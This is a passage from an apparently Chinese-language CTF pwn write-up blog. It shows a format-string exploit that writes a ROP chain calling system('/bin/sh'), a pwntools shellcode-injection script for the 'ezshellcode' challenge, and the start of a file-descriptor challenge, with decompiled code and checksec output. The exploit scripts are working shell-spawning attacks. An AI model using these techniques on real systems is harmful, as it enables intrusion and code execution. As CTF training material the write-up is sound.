him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((og&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%47$hhn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x000000000002a3e5 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000029139 : ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x50d70</span></span><br><span class="line">binsh = libc_base + <span class="number">0x1d8678</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">fmt = <span class="number">0x4040C0</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(ret&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1+<span class="number">2</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((ret&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%47$hhn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---0</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1+<span class="number">8</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(pop_rdi&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1+<span class="number">10</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((pop_rdi&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1+<span class="number">12</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((pop_rdi&gt;&gt;<span class="number">16</span>)&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----1</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1+<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(binsh&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1+<span class="number">18</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((binsh&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1+<span class="number">20</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((binsh&gt;&gt;<span class="number">16</span>)&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----2</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1+<span class="number">24</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(system_addr&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1+<span class="number">26</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((system_addr&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((stack1+<span class="number">28</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%20$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(((system_addr&gt;&gt;<span class="number">16</span>)&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%47$hn&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;You start talking to him...&#x27;</span>,p64(pop_rdi) + p64(binsh) + p64(system_addr))</span><br><span class="line">p.sendafter(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>,<span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h1 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>IDA分析：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n4; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">    <span class="type">int</span> prot; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">    <span class="type">int</span> n10; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">    <span class="type">void</span> *s; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    s = mmap(<span class="number">0LL</span>, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( s == (<span class="type">void</span> *)<span class="number">-1LL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x1000</span>uLL);</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    prot = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In a ret2text exploit, we can use code in the .text segment.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;But now, there is no &#x27;system&#x27; function available there.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How can you get the flag now? Perhaps you should use shellcode.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;But what is shellcode? What can you do with it? And how can you use it?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;I will give you some choices. Choose wisely!&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n4);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">        n10 = getchar();</span><br><span class="line">    <span class="keyword">while</span> ( n10 != <span class="number">10</span> &amp;&amp; n10 != <span class="number">-1</span> );</span><br><span class="line">    <span class="keyword">if</span> ( n4 == <span class="number">4</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;You can only make one change!&quot;</span>);</span><br><span class="line">        prot = <span class="number">7</span>;</span><br><span class="line">        v6 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( n4 &gt; <span class="number">4</span> )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_24;</span><br><span class="line">        <span class="keyword">switch</span> ( n4 )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;You can only make one change!&quot;</span>);</span><br><span class="line">                prot = <span class="number">4</span>;</span><br><span class="line">                v6 = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;You can only make one change!&quot;</span>);</span><br><span class="line">                prot = <span class="number">1</span>;</span><br><span class="line">                v6 = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">if</span> ( v6 == <span class="number">1</span> )</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;You can only make one change!&quot;</span>);</span><br><span class="line">                prot = <span class="number">3</span>;</span><br><span class="line">                v6 = <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                LABEL_24:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice. The space remains in its chaotic state.&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( mprotect(s, <span class="number">0x1000</span>uLL, prot) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">&quot;mprotect&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nYou have now changed the permissions of the shellcode area.&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;If you can&#x27;t input your shellcode, think about the permissions you just set.&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x1000</span>uLL);</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))s)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>checksec检查：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./ezshellcode</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   50 Symbols        No    0               2               ./ezshellcode</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这里保护基本都开了，根据题目描述推测ret2shellcode</p>
<h3 id="what-is-shellcode"><a href="#what-is-shellcode" class="headerlink" title="what is shellcode?"></a>what is shellcode?</h3><p>Shellcode 是攻击者利用软件漏洞注入到目标程序内存中并强制其执行的一段精心构造的、自包含的、位置无关的原始机器码，旨在执行未授权的操作（如获取系统控制权）。</p>
<h3 id="how-to-solve-a-ret2shellcode-problem"><a href="#how-to-solve-a-ret2shellcode-problem" class="headerlink" title="how to solve a ret2shellcode problem?"></a>how to solve a ret2shellcode problem?</h3><p>ret2shellcode的使用要求是比较苛刻的，因为它是执行输入进去的内容，而很多时候程序并不会给用户输入内容给予执行权限。</p>
<h4 id="可能的攻击手段"><a href="#可能的攻击手段" class="headerlink" title="可能的攻击手段"></a>可能的攻击手段</h4><h5 id="1-向stack段中注入shellcode"><a href="#1-向stack段中注入shellcode" class="headerlink" title="1.向stack段中注入shellcode"></a>1.向stack段中注入shellcode</h5><p>能向栈中注入shellcode的情况非常少见，这是因为目前的操作系统及程序一般都会开启对栈的保护。比较常见的保护手段有：</p>
<ul>
<li>ASLR（Address Space Layout Randmization）：该防御手段在Linux和Windows中都非常常见。其功能是将一部分内存段（如栈等）的地址进行随机偏移，使得攻击者即使成功注入了shellcode也难以定位其位置，进而达到防御的目的；</li>
<li>The NX（No-eXecute） bits：该防御手段使得部分内存段（如堆、栈等）不可执行，攻击者即使成功注入了shellcode也无法执行其中代码，进而达到防御的目的；</li>
<li>Canary：该防御手段的原理是在栈底插入cookie信息，函数返回时将检测该信息是否被改变，若被改变则可断定发生了溢出，进而可以立刻终止程序运行。</li>
</ul>
<h5 id="2-向bss段中注入shellcode"><a href="#2-向bss段中注入shellcode" class="headerlink" title="2.向bss段中注入shellcode"></a>2.向bss段中注入shellcode</h5><p>在虚拟内存中，bss段主要保存的是没有初值的全局变量或静态变量（在汇编语言中通过占位符？声明）。若某个程序的bss段可写且可执行，攻击者就可以尝试将shellcode注入写入全局变量或静态变量中。</p>
<h5 id="3-向data段中注入shellcode"><a href="#3-向data段中注入shellcode" class="headerlink" title="3.向data段中注入shellcode"></a>3.向data段中注入shellcode</h5><p>在虚拟内存中，data段主要保存的是已经初始化了的全局变量或静态变量。其攻击思路与向bss段中注入shellcode非常类似。</p>
<h5 id="4-向heap段中注入shellcode"><a href="#4-向heap段中注入shellcode" class="headerlink" title="4.向heap段中注入shellcode"></a>4.向heap段中注入shellcode</h5><p>heap段主要保存的是通过动态内存分配产生的变量。若某个程序的heap段可写且可执行，攻击者就可以尝试将shellcode注入至动态分配的变量中。</p>
<h4 id="实用工具"><a href="#实用工具" class="headerlink" title="实用工具"></a>实用工具</h4><p>pwntools生成Shellcode</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成Linux/x86的execve(&quot;/bin/sh&quot;)</span></span><br><span class="line">shellcode = asm(shellcraft.sh())    </span><br><span class="line"><span class="comment"># 避免坏字符（如\x00）</span></span><br><span class="line">shellcode = asm(shellcraft.sh().replace(<span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;&quot;</span>))[<span class="number">1</span>,<span class="number">5</span>](@ref)</span><br></pre></td></tr></table></figure></div>

<h3 id="脚本分析-1"><a href="#脚本分析-1" class="headerlink" title="脚本分析"></a>脚本分析</h3><div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;) </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">p = process(<span class="string">&#x27;./ezshellcode&#x27;</span>)</span></span><br><span class="line">p = remote(&#x27;127.0.0.1&#x27;,40307)</span><br><span class="line">p.recvuntil(b&#x27;Choose wisely!\n&#x27;)</span><br><span class="line">p.sendline(b&#x27;4&#x27;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">我们需要选择权限可读可写的区域</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">p.recvuntil(b&#x27;you just set.&#x27;)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())  </span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">使用pwntools生成shellcode</span><br><span class="line">与context.arch有关，需要首先设置</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">p.send((shellcode))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="find-it"><a href="#find-it" class="headerlink" title="find_it"></a>find_it</h2><p>IDA分析：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">char</span> file[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    fd = dup(<span class="number">1</span>);</span><br><span class="line">    write(fd, <span class="string">&quot;I&#x27;ve hidden the fd of stdout. Can you find it?\n&quot;</span>, <span class="number">0x2F</span>uLL);</span><br><span class="line">    close(<span class="number">1</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;fd1);</span><br><span class="line">    write(fd1, <span class="string">&quot;You are right.What would you like to see?\n&quot;</span>, <span class="number">0x2A</span>uLL);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%s%*c&quot;</span>, file);</span><br><span class="line">    open(file, <span class="number">0</span>);</span><br><span class="line">    write(fd1, <span class="string">&quot;What is its fd?\n&quot;</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;fd2);</span><br><span class="line">    read(fd2, &amp;buf, <span class="number">0x50</span>uLL);</span><br><span class="line">    write(fd1, &amp;buf, <span class="number">0x50</span>uLL);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>checksec分析：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./findit</span>       </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   50 Symbols        No    0               1               ./findit</span><br></pre></td></tr></table></figure></div>

<p>保护全开，题目的主要知识点是<strong>文件描述符</strong></p>
<h3 id="what-is-file-descriptor"><a href="#what-is-file-descriptor" class="headerlink" title="what is file descriptor?"></a>what is file descriptor?</h3><p><code>fd</code> 是 <code>File descriptor</code> 的缩写，中文名叫做：<strong>文件描述符</strong>。<strong>文件描述符</strong> 是一个非负整数，<strong>本质上是一个索引值</strong>（这句话非常重要）。</p>
<p>当需要 <code>read</code>、<code>write</code> 这个文件时，则只需要用这个 <strong>文件描述符</strong> 来标识该文件，将其作为参数传入 <code>read</code>、<code>write</code>。</p>
